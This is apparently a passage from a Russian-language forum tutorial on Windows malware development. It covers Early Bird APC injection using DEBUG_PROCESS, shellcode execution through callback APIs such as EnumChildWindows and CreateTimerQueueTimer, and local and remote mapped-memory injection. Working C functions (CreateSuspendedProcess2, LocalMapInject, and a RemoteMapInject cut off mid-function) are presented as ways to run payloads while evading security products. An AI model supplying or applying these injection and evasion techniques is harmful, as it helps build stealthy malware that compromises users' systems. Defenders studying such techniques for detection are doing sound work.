<li data-xf-list-type="ol">Получить дескриптор приостановленного потока из CreateProcess вместе с базовым адресом полезной нагрузки и передать их в QueueUserAPC.</li>
<li data-xf-list-type="ol">Возобновить поток с использованием WinAPI ResumeThread для выполнения полезной нагрузки.</li>
</ol><b>Альтернативный способ реализации Early Bird APC Injection:</b><br />
<br />
Будет использоваться CreateProcess, но флаг создания процесса будет изменен с CREATE_SUSPENDED на DEBUG_PROCESS. Флаг DEBUG_PROCESS создает новый процесс в качестве отлаживаемого процесса и делает локальный процесс его отладчиком. Когда процесс создается как отлаживаемый процесс, точка останова устанавливается в его точке входа. <b><u>Это приостанавливает процесс и ожидает, когда отладчик (то есть вредоносное ПО) возобновит выполнение.</u></b><br />
<br />
Когда это происходит, полезная нагрузка внедряется в целевой процесс для выполнения с помощью WinAPI QueueUserAPC. После внедрения полезной нагрузки и постановки в очередь отлаживаемого потока для выполнения полезной нагрузки, локальный процесс может быть отсоединен от целевого процесса с использованием DebugActiveProcessStop WinAPI, что прекращает отладку удаленного процесса.<br />
<br />
DebugActiveProcessStop требует только одного параметра, который представляет собой PID отлаживаемого процесса, который можно получить из структуры PROCESS_INFORMATION, заполненной CreateProcess.<br />
<br />
<b>Обновленная логика будет следующей:</b><br />
<ol>
<li data-xf-list-type="ol">Создать отлаживаемый процесс, установив флаг DEBUG_PROCESS.</li>
<li data-xf-list-type="ol">Записать полезную нагрузку в адресное пространство нового целевого процесса.</li>
<li data-xf-list-type="ol">Получить дескриптор отлаживаемого потока из CreateProcess вместе с базовым адресом полезной нагрузки и передать их в QueueUserAPC.</li>
<li data-xf-list-type="ol">Прекратить отладку удаленного процесса с использованием DebugActiveProcessStop, который возобновляет его потоки и выполняет полезную нагрузку.</li>
</ol><b><u>Пример реализации:</u></b><br />
<br />
CreateSuspendedProcess2 - это функция, которая создает процесс в приостановленном состоянии:<br />
<ul>
<li data-xf-list-type="ul">lpProcessName - Имя процесса для создания.</li>
<li data-xf-list-type="ul">dwProcessId - Указатель на DWORD, который получит PID только что созданного процесса.</li>
<li data-xf-list-type="ul">hProcess - Указатель на HANDLE, который получит дескриптор только что созданного процесса.</li>
<li data-xf-list-type="ul">hThread - Указатель на HANDLE, который получит дескриптор только что созданного потока процесса.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

CHAR lpPath   [MAX_PATH * 2];
CHAR WnDr     [MAX_PATH];

STARTUPINFO            Si    = { 0 };
PROCESS_INFORMATION    Pi    = { 0 };

// Очистка структур, установка значений элементов в 0
RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

// Установка размера структуры
Si.cb = sizeof(STARTUPINFO);

// Получение пути переменной окружения %WINDIR% (который обычно равен &#039;C:\Windows&#039;)
if (!GetEnvironmentVariableA(&quot;WINDIR&quot;, WnDr, MAX_PATH)) {
    printf(&quot;[!] GetEnvironmentVariableA не удалось выполнить с ошибкой : %d \n&quot;, GetLastError());
    return FALSE;
}

// Создание пути к целевому процессу
sprintf(lpPath, &quot;%s\\System32\\%s&quot;, WnDr, lpProcessName);
printf(&quot;\n\t[i] Запуск : \&quot;%s\&quot; ... &quot;, lpPath);

// Создание процесса
if (!CreateProcessA(
    NULL,
    lpPath,
    NULL,
    NULL,
    FALSE,
    DEBUG_PROCESS,        // Вместо CREATE_SUSPENDED
    NULL,
    NULL,
    &amp;Si,
    &amp;Pi)) {
    printf(&quot;[!] CreateProcessA не удалось выполнить с ошибкой : %d \n&quot;, GetLastError());
    return FALSE;
}

printf(&quot;[+] ГОТОВО \n&quot;);

// Заполнение выходного параметра результатами выполнения CreateProcessA
*dwProcessId        = Pi.dwProcessId;
*hProcess           = Pi.hProcess;
*hThread            = Pi.hThread;

// Проверка наличия всего необходимого
if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
    return TRUE;

return FALSE;
}</code></pre>
	</div>
</div><br />
Далее необходимо:<br />
<ul>
<li data-xf-list-type="ul">Записать полезную нагрузку в адресное пространство нового целевого процесса.</li>
<li data-xf-list-type="ul">Передать dwProcessId и адрес полезной нагрузки  в QueueUserAPC.</li>
<li data-xf-list-type="ul">Прекратить отладку удаленного процесса вызвав DebugActiveProcessStop, который возобновляет его потоки и выполняет полезную нагрузку.</li>
</ul>Данные действия предлагаю выполнить в качестве домашнего задания.)))<br />
<br />
<b>Демо</b><br />
На изображении ниже показан только что созданный целевой процесс в состоянии отладки. Отлаживаемый процесс выделен пурпурным цветом в Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782946335.png"
		data-src="https://osint42.org/attachments/1746782946335-png.138/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782946335-png.138/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782946335.png"
			title="1746782946335.png"
			width="1332" height="754" loading="lazy" />
	</div><br />
<br />
Далее полезная нагрузка записывается в целевой процесс.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782956568.png"
		data-src="https://osint42.org/attachments/1746782956568-png.139/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782956568-png.139/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782956568.png"
			title="1746782956568.png"
			width="1676" height="884" loading="lazy" />
	</div><br />
<br />
Наконец, полезная нагрузка выполняется.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782964457.png"
		data-src="https://osint42.org/attachments/1746782964457-png.140/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782964457-png.140/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782964457.png"
			title="1746782964457.png"
			width="1557" height="708" loading="lazy" />
	</div></div>
						

							<h2>Вызов кода через функции обратного вызова</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746783119535.png"
		data-src="https://osint42.org/attachments/1746783119535-png.141/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783119535-png.141/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783119535.png"
			title="1746783119535.png"
			width="645" height="208" loading="lazy" />
	</div><br />
<br />
<b>Введение</b><br />
<br />
Функции обратного вызова используются для обработки событий или выполнения действия, когда выполняется определенное условие. Они применяются в различных сценариях в операционной системе Windows, включая обработку событий, управление окнами и многопоточность.<br />
<br />
<b>Определение функции обратного вызова от Microsoft следующее:</b><br />
<br />
Функция обратного вызова - это код в управляемом приложении, который помогает функции неконтролируемой DLL завершить задачу. Вызовы функции обратного вызова передаются косвенно из управляемого приложения через функцию DLL и обратно к управляемой реализации.<br />
<br />
Некоторые обычные API Windows имеют возможность выполнять полезные нагрузки с помощью обратных вызовов. Их использование предоставляет преимущества перед решениями безопасности, так как эти функции могут казаться безвредными и потенциально уклоняться от некоторых решений по безопасности.<br />
<br />
<b>Злоупотребление функциями обратного вызова</b><br />
<br />
Обратные вызовы Windows можно выполнить с помощью указателя на функцию. Чтобы запустить полезную нагрузку, адрес полезной нагрузки должен быть передан вместо действительного указателя на функцию обратного вызова. <b><u>Выполнение обратного вызова может заменить использование CreateThread WinAPI и других техник, связанных с выполнением потоков.</u></b> Кроме того, нет необходимости правильно использовать функции, передавая соответствующие параметры. Возвращаемое значение или функциональность этих функций не имеют значения.<br />
<br />
Одним важным моментом о функциях обратного вызова является то, что они работают только в адресном пространстве локального процесса и не могут быть использованы для выполнения техник внедрения удаленного кода.<br />
<br />
<b>Примеры функций обратного вызова</b><br />
<br />
Следующие функции способны выполнять функции обратного вызова.<br />
<br />
3-й параметр CreateTimerQueueTimer:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateTimerQueueTimer(
[out] PHANDLE phNewTimer,
[in, optional] HANDLE TimerQueue,
[in] WAITORTIMERCALLBACK Callback, // здесь
[in, optional] PVOID Parameter,
[in] DWORD DueTime,
[in] DWORD Period,
[in] ULONG Flags
);</code></pre>
	</div>
</div><br />
2-й параметр EnumChildWindows:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL EnumChildWindows(
[in, optional] HWND hWndParent,
[in] WNDENUMPROC lpEnumFunc, // здесь
[in] LPARAM lParam
);</code></pre>
	</div>
</div><br />
1-й параметр EnumUILanguagesW:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL EnumUILanguagesW(
[in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc, // здесь
[in] DWORD dwFlags,
[in] LONG_PTR lParam
);</code></pre>
	</div>
</div><br />
4-й параметр VerifierEnumerateResource:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>ULONG VerifierEnumerateResource(
HANDLE Process,
ULONG Flags,
ULONG ResourceType,
AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback, // здесь
PVOID EnumerationContext
);</code></pre>
	</div>
</div><br />
Следующие разделы предоставят подробные объяснения для каждой из этих функций. Полезная нагрузка, используемая в примерах кода, хранится в разделе .text бинарного файла. Это позволяет shellcode иметь необходимые разрешения памяти RX, не прибегая к выделению исполняемой памяти с использованием VirtualAlloc или других функций выделения памяти.<br />
<br />
<b>Использование CreateTimerQueueTimer</b><br />
<br />
CreateTimerQueueTimer создает новый таймер и добавляет его в указанную очередь таймеров. Таймер определяется с помощью функции обратного вызова, которая вызывается, когда таймер истекает. Функция обратного вызова выполняется потоком, который создал очередь таймеров.<br />
<br />
Приведенный ниже фрагмент выполняет код, расположенный в Payload, как функцию обратного вызова.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hTimer = NULL;

if (!CreateTimerQueueTimer(&amp;hTimer, NULL, (WAITORTIMERCALLBACK)Payload, NULL, NULL, NULL, NULL)){
printf(&quot;[!] CreateTimerQueueTimer не удалось с ошибкой: %d \n&quot;, GetLastError());
return -1;
}</code></pre>
	</div>
</div><br />
<b>Использование EnumChildWindows</b><br />
<br />
EnumChildWindows позволяет программе перечислять дочерние окна родительского окна. Он принимает дескриптор родительского окна в качестве входных данных и применяет определенную пользователем функцию обратного вызова к каждому из дочерних окон поочередно. Функция обратного вызова вызывается для каждого дочернего окна и получает дескриптор дочернего окна и значение, определенное пользователем, в качестве параметров.<br />
<br />
Приведенный ниже фрагмент выполняет код, расположенный в Payload, как функцию обратного вызова.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
    printf(&quot;[!] EnumChildWindows не удалось с ошибкой: %d \n&quot;, GetLastError());
    return -1;
}</code></pre>
	</div>
</div><br />
<b>Использование EnumUILanguagesW</b><br />
<br />
EnumUILanguagesW перечисляет языки пользовательского интерфейса (UI), установленные в системе. Он принимает функцию обратного вызова в качестве параметра и применяет функцию обратного вызова к каждому языку UI поочередно. Обратите внимание, что любое значение вместо флага MUI_LANGUAGE_NAME все равно работает.<br />
<br />
Приведенный ниже фрагмент выполняет код, расположенный в Payload, как функцию обратного вызова.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)Payload, MUI_LANGUAGE_NAME, NULL)) {
    printf(&quot;[!] EnumUILanguagesW не удалось с ошибкой: %d \n&quot;, GetLastError());
    return -1;
}</code></pre>
	</div>
</div><br />
<b>Использование VerifierEnumerateResource</b><br />
<br />
VerifierEnumerateResource используется для перечисления ресурсов в указанном модуле. Ресурсы - это данные, которые хранятся в модуле (например, в исполняемом файле или библиотеке динамической компоновки) и к которым можно получить доступ модулем или другими модулями во время выполнения. Примеры ресурсов включают строки, битовые изображения и шаблоны диалоговых окон.<br />
<br />
VerifierEnumerateResource экспортируется из verifier.dll, поэтому модуль должен быть динамически загружен с использованием LoadLibrary и GetProcAddress WinAPI для доступа к функции.<br />
<br />
Обратите внимание, что если параметр ResourceType не равен AvrfResourceHeapAllocation, то полезная нагрузка не будет выполнена. AvrfResourceHeapAllocation позволяет функции перечислять выделение кучи, включая блоки метаданных кучи.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE hModule = NULL;
fnVerifierEnumerateResource pVerifierEnumerateResource = NULL;

hModule = LoadLibraryA(&quot;verifier.dll&quot;);
if (hModule == NULL){
    printf(&quot;[!] LoadLibraryA не удалось с ошибкой: %d \n&quot;, GetLastError());
    return -1;
}

pVerifierEnumerateResource = GetProcAddress(hModule, &quot;VerifierEnumerateResource&quot;);
if (pVerifierEnumerateResource == NULL) {
    printf(&quot;[!] GetProcAddress не удалось с ошибкой: %d \n&quot;, GetLastError());
    return -1;
}

// Необходимо установить флаг AvrfResourceHeapAllocation для выполнения полезной нагрузки
pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload, NULL);</code></pre>
	</div>
</div><br />
<b>Заключение</b><br />
<br />
В этой статье рассмотрено несколько функций обратного вызова и продемонстрировано их использование для выполнения полезной нагрузки. Функции обратного вызова полезны только тогда, когда полезная нагрузка работает в адресном пространстве памяти локального процесса.<br />
<br />
Страницу документации Microsoft можно исследовать, чтобы обнаружить дополнительные функции обратного вызова.<br />
<br />
Кроме того, <a href="https://github.com/aahmad097/AlternativeShellcodeExec" target="_blank" class="link link--external" rel="noopener"><b><span style="color: rgb(184, 49, 47)">был создан репозиторий GitHub</span></b></a>, который содержит список наиболее распространенных функций обратного вызова.</div>
						

							<h2>Инъекция отображаемой памяти</h2>

							

							

							<div class="bbWrapper"><h3 class="bbHeading"><a class="u-anchorTarget" name="-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati"></a>Локальная инъекция отображаемой памяти&#8203;<a class="hoverLink" href="#-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati" title="Постоянная ссылка"></a></h3><h3 class="bbHeading"><a class="u-anchorTarget" name="-vvedeniye"></a>Введение&#8203;<a class="hoverLink" href="#-vvedeniye" title="Постоянная ссылка"></a></h3>До сих пор во всех предыдущих реализациях использовался тип локальной памяти для хранения полезной нагрузки во время выполнения. Локальная память выделяется с использованием VirtualAlloc или VirtualAllocEx.<br />
<br />
На следующем изображении показана выделенная локальная память в реализации &quot;LocalThreadHijacking&quot;, содержащей полезную нагрузку.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783380918.png"
		data-src="https://osint42.org/attachments/1746783380918-png.142/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783380918-png.142/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783380918.png"
			title="1746783380918.png"
			width="1148" height="279" loading="lazy" />
	</div><br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-otobrazhayemaya-pamyat"></a>Отображаемая память&#8203;<a class="hoverLink" href="#-otobrazhayemaya-pamyat" title="Постоянная ссылка"></a></h3>Процесс выделения локальной памяти тщательно отслеживается средствами безопасности из-за его широкого использования вредоносным программам.<br />
<br />
<b>Чтобы избежать таких часто контролируемых WinAPI,</b> таких-как VirtualAlloc/Ex и VirtualProtect/Ex, инъекция отображаемой памяти использует тип отображаемой памяти с использованием различных WinAPI, таких как CreateFileMapping и MapViewOfFile.<br />
<br />
Также стоит отметить, что WinAPI VirtualProtect/Ex не может использоваться для изменения разрешений памяти отображаемой памяти.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati-2"></a>Локальная инъекция отображаемой памяти&#8203;<a class="hoverLink" href="#-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati-2" title="Постоянная ссылка"></a></h3>Этот раздел объясняет WinAPI, необходимые для выполнения локальной инъекции отображаемой памяти.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-createfilemapping"></a>CreateFileMapping&#8203;<a class="hoverLink" href="#-createfilemapping" title="Постоянная ссылка"></a></h3>CreateFileMapping создает объект отображения файла, предоставляя доступ к содержимому файла через техники отображения памяти.<br />
Это позволяет процессу создать виртуальное пространство памяти, которое отображается на содержимое файла на диске или на другое место в памяти. Функция возвращает дескриптор объекта отображения файла.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE CreateFileMappingA(
  [in]           HANDLE                hFile,
  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,     // Не требуется - NULL
  [in]           DWORD                 flProtect,
  [in]           DWORD                 dwMaximumSizeHigh,           // Не требуется - NULL
  [in]           DWORD                 dwMaximumSizeLow,
  [in, optional] LPCSTR                lpName                       // Не требуется - NULL
);</code></pre>
	</div>
</div><br />
Три обязательных параметра для этой техники объяснены ниже. Параметры, отмеченные как необязательные, могут быть установлены в NULL.<br />
<ul>
<li data-xf-list-type="ul"><b>hFile</b> — дескриптор файла, из которого создается дескриптор отображения файла. Поскольку создание отображения файла из файла не требуется в реализации, может быть использован флаг INVALID_HANDLE_VALUE.</li>
<li data-xf-list-type="ul"><b>flProtect</b> — определяет защиту страницы объекта отображения файла. В этой реализации будет установлено PAGE_EXECUTE_READWRITE.</li>
<li data-xf-list-type="ul"><b>dwMaximumSizeLow</b> — размер возвращаемого дескриптора отображения файла. Значение этого параметра будет размером полезной нагрузки.</li>
</ul><br />
<b>MapViewOfFile</b><br />
<br />
MapViewOfFile отображает объект отображения файла в адресном пространстве процесса. Он принимает дескриптор объекта отображения файла и желаемые права доступа и возвращает указатель на начало отображения в адресном пространстве процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LPVOID MapViewOfFile(
  [in] HANDLE     hFileMappingObject,
  [in] DWORD      dwDesiredAccess,
  [in] DWORD      dwFileOffsetHigh,           // Not Required - NULL
  [in] DWORD      dwFileOffsetLow,            // Not Required - NULL
  [in] SIZE_T     dwNumberOfBytesToMap
);</code></pre>
	</div>
</div><br />
Три обязательных параметра для этой техники объяснены ниже. Параметры, отмеченные как необязательные, могут быть установлены в NULL.<br />
<ul>
<li data-xf-list-type="ul"><b>hFileMappingObject</b> — возвращаемый дескриптор из WinAPI CreateFileMapping, который является объектом отображения файла.</li>
<li data-xf-list-type="ul"><b>dwDesiredAccess</b> — тип доступа к объекту отображения файла, который определяет защиту страницы созданной страницы.</li>
<li data-xf-list-type="ul"><b>dwNumberOfBytesToMap</b> — размер полезной нагрузки.</li>
</ul><h3 class="bbHeading"><a class="u-anchorTarget" name="-funktsiya-localmapinject"></a>Функция LocalMapInject&#8203;<a class="hoverLink" href="#-funktsiya-localmapinject" title="Постоянная ссылка"></a></h3>LocalMapInject — функция, выполняющая локальную инъекцию отображаемой памяти. Она принимает 3 аргумента:<br />
<ul>
<li data-xf-list-type="ul">pPayload — базовый адрес полезной нагрузки.</li>
<li data-xf-list-type="ul">sPayloadSize — размер полезной нагрузки.</li>
<li data-xf-list-type="ul">ppAddress — указатель на PVOID, который получает базовый адрес отображаемой памяти.</li>
</ul>Функция выделяет локально отображаемый исполняемый буфер и копирует в этот буфер полезную нагрузку, затем возвращает базовый адрес отображаемой памяти.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL   bSTATE         = TRUE;
    HANDLE hFile          = NULL;
    PVOID  pMapAddress    = NULL;

    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf(&quot;[!] CreateFileMapping Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    if (pMapAddress == NULL) {
        printf(&quot;[!] MapViewOfFile Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    memcpy(pMapAddress, pPayload, sPayloadSize);

_EndOfFunction:
    *ppAddress = pMapAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>UnmapViewOfFile</b><br />
<br />
UnmapViewOfFile — это WinAPI, который используется для деактивации ранее отображаемой памяти. Эта функция должна вызываться только после завершения выполнения полезной нагрузки и не во время ее выполнения. UnmapViewOfFile требует только базовый адрес отображаемого представления файла для его деактивации.<br />
<br />
<b>Демо</b><br />
<br />
Выделение буфера отображаемой памяти.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783393973.png"
		data-src="https://osint42.org/attachments/1746783393973-png.143/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783393973-png.143/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783393973.png"
			title="1746783393973.png"
			width="1567" height="768" loading="lazy" />
	</div><br />
<br />
Копирование нагрузки<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783401440.png"
		data-src="https://osint42.org/attachments/1746783401440-png.144/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783401440-png.144/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783401440.png"
			title="1746783401440.png"
			width="1650" height="665" loading="lazy" />
	</div><br />
<br />
Запуск, через создание потока<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783408576.png"
		data-src="https://osint42.org/attachments/1746783408576-png.145/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783408576-png.145/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783408576.png"
			title="1746783408576.png"
			width="1454" height="801" loading="lazy" />
	</div><br />
<br />
<br />
<b>Удаленная инъекция через отображение памяти</b><br />
<br />
В этом разделе объясняются WinAPI, необходимые для удаленной инъекции через отображение памяти. Шаги выполнения удаленной инъекции через отображение памяти перечислены ниже.<br />
<ol>
<li data-xf-list-type="ol">Вызывается CreateFileMapping для создания объекта отображения файла.</li>
<li data-xf-list-type="ol">Затем вызывается MapViewOfFile, чтобы отобразить объект отображения файла в адресное пространство локального процесса.</li>
<li data-xf-list-type="ol">Полезная нагрузка перемещается в локально выделенную память.</li>
<li data-xf-list-type="ol">Новое представление файла отображается в удаленное адресное пространство целевого процесса, используя MapViewOfFile2, отображая локальное представление файла в удаленный процесс, и таким образом, нашу скопированную полезную нагрузку.</li>
</ol><b>MapViewOfFile2</b><br />
<br />
MapViewOfFile2 отображает представление файла в адресное пространство указанного, удаленного процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>PVOID MapViewOfFile2(
  [in]           HANDLE  FileMappingHandle,   // Дескриптор для объекта отображения файла, возвращенного CreateFileMappingA/W
  [in]           HANDLE  ProcessHandle,       // Дескриптор целевого процесса
  [in]           ULONG64 Offset,              // Не требуется - NULL
  [in, optional] PVOID   BaseAddress,         // Не требуется - NULL
  [in]           SIZE_T  ViewSize,            // Не требуется - NULL
  [in]           ULONG   AllocationType,      // Не требуется - NULL
  [in]           ULONG   PageProtection       // Желаемая защита страницы.
);</code></pre>
	</div>
</div><ul>
<li data-xf-list-type="ul"><b>FileMappingHandle</b> - дескриптор раздела, который будет отображен в адресное пространство указанного процесса.</li>
<li data-xf-list-type="ul"><b>ProcessHandle</b> - дескриптор процесса, в котором будет отображен раздел. Дескриптор должен иметь маску доступа PROCESS_VM_OPERATION.</li>
<li data-xf-list-type="ul"><b>PageProtection</b> - желаемая защита страницы.</li>
</ul><b>Примечание по реализации</b><br />
<br />
В отличие от локальной инъекции через отображение памяти, нет необходимости делать локальное представление файла исполняемым, так как полезная нагрузка не выполняется локально. Вместо этого MapViewOfFile использует флаг FILE_MAP_WRITE для копирования полезной нагрузки.<br />
MapViewOfFile2 затем отображает те же байты в адресное пространство целевого процесса.<br />
<br />
MapViewOfFile2 делит дескриптор отображения файла с MapViewOfFile. Следовательно, любые изменения полезной нагрузки в локально отображенном представлении файла отражаются в удаленном отображенном представлении файла в удаленном процессе. Это полезно для реальных реализаций, где требуется выполнить зашифрованную полезную нагрузку, так как полезная нагрузка может быть отображена в удаленный процесс и дешифрована локально, тем самым дешифруя полезную нагрузку в удаленном представлении файла для выполнения.<br />
<br />
<b>Функция удаленной инъекции через отображение памяти</b><br />
<br />
RemoteMapInject - это функция, которая выполняет удаленную инъекцию через отображение памяти. Она принимает 4 аргумента:<br />
<ul>
<li data-xf-list-type="ul"><b>hProcess</b> - дескриптор целевого процесса.</li>
<li data-xf-list-type="ul"><b>pPayload</b> - базовый адрес полезной нагрузки.</li>
<li data-xf-list-type="ul"><b>sPayloadSize</b> - размер полезной нагрузки.</li>
<li data-xf-list-type="ul"><b>ppAddress</b> - указатель на PVOID, который получает базовый адрес отображенной памяти.</li>
</ul>Функция выделяет локально отображаемый буфер, доступный для чтения и записи, затем копирует в него полезную нагрузку. Затем она использует MapViewOfFile2 для отображения локальной полезной нагрузки в новый удаленный буфер в целевом процессе и, наконец, возвращает базовый адрес отображенной памяти.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL        bSTATE            = TRUE;
    HANDLE      hFile             = NULL;
    PVOID       pMapLocalAddress  = NULL,
                pMapRemoteAddress = NULL;

    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
